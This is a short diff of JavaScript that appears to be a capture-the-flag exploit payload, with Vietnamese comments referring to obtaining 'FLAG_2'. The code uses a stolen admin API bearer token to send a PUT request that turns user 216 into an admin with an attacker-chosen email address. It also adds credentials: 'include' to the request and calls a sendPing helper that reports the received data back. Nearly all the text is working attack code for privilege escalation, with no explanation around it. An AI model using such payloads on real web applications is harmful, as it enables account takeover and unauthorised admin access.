@@ -72,18 +72,20 @@
 
                     const formData = {
                         name: "NGOCCCCCCCCCCCCNGOCCCCCCCCCCCC",
-                        email: "ngocn1@gmail.com",
+                        email: "ngocnn4@hackmail.com",
                         role: "admin",
                     };
-                    // Bước 2: Dùng API Token để lấy FLAG_2
+                    // Bước 2: 
                     return fetch("/api/admin/users/216", {
                             method: "PUT",
                             headers: {
-                               "Accept": "application/json",
+                                "Content-Type": "application/json",
+                                "Accept": "application/json",
                                 "Authorization": "Bearer " + adminApiToken, // QUAN TRỌNG!
                                 "X-Requested-With": "XMLHttpRequest"
                             },
-                            body: JSON.stringify(formData)
+                            credentials: "include",
+                            body: JSON.stringify(formData),
                         });
                 } else {
                     sendPing({ stage: "gen_token_SUCCESS_but_no_token_field", received_data: JSON.stringify(data) });
